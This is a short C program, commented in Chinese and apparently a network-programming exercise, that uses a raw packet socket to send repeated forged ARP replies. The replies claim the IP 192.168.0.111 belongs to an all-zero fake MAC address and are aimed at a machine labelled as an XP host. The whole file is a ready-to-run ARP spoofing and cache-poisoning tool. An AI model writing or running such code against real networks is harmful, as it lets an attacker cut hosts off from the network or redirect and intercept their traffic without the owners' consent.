#include<stdio.h>
#include<sys/socket.h>
#include<netinet/ether.h>
#include <sys/ioctl.h>//ioctl
#include <net/if.h>//struct ifreq
#include <netpacket/packet.h>//struct sockaddr_ll
#include<unistd.h>//_exit
#include<string.h>//strncpy
void my_sendto(int sockfd, char *out, unsigned char *msg, int msg_len);

int main()
{
	//1、创建原始套接字
	int sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sockfd < 0)
	{
		perror("socket");
		return 0;
	}
	
	//msg存放arp应答报文
	unsigned char msg[]={
		/*mac报文头部 14B*/
		0x70,0x5A,0x0F,0x63,0xF5,0x9D,/*目的mac地址 XPmac*/
		0x00,0x00,0x00,0x00,0x00,0x00,/*源mac地址伪装的mac 假的*/
		0x08,0x06,/*帧类型*/
		
		/*ARP报文头部 28B*/
		0x00,0x01,/*硬件类型*/
		0x08,0x00,/*协议类型*/
		6,/*硬件地址长度*/
		4,/*协议地址长度*/
		0x00,0x02,/*2 ARP应答*/
		0x00,0x00,0x00,0x00,0x00,0x00,/*源mac地址伪装的mac 假的*/
		192,168,0,111,/*源IP 根据自己修改 ubuntu_ip*/
		0x70,0x5A,0x0F,0x63,0xF5,0x9D,/*目的mac地址 xp_mac*/
		192,168,0,110/*目的IP*/
	};
	
	//发送arp请求帧数据
	int i=0;
	for(i=1;i<20;i++)
	{
		my_sendto(sockfd, "eth0",msg, 42);
		sleep(1);
	}
	
	
	close(sockfd);
	return 0;
}
void my_sendto(int sockfd, char *out, unsigned char *msg, int msg_len)
{
	//通过ioctl得到网络接口
	struct ifreq ethreq;
	strncpy(ethreq.ifr_name, out, IFNAMSIZ);
	if(-1 == ioctl(sockfd, SIOCGIFINDEX, &ethreq))
	{
		perror("ioctl");
		close(sockfd);
		_exit(-1);
	}
	
	//帧数据 出去的本地接口
	struct sockaddr_ll sll;
	bzero(&sll,sizeof(sll));
	sll.sll_ifindex = ethreq.ifr_ifindex;
	//2、发送组好报文的帧数据
	sendto(sockfd, msg, msg_len, 0, (struct sockaddr *)&sll, sizeof(sll));
}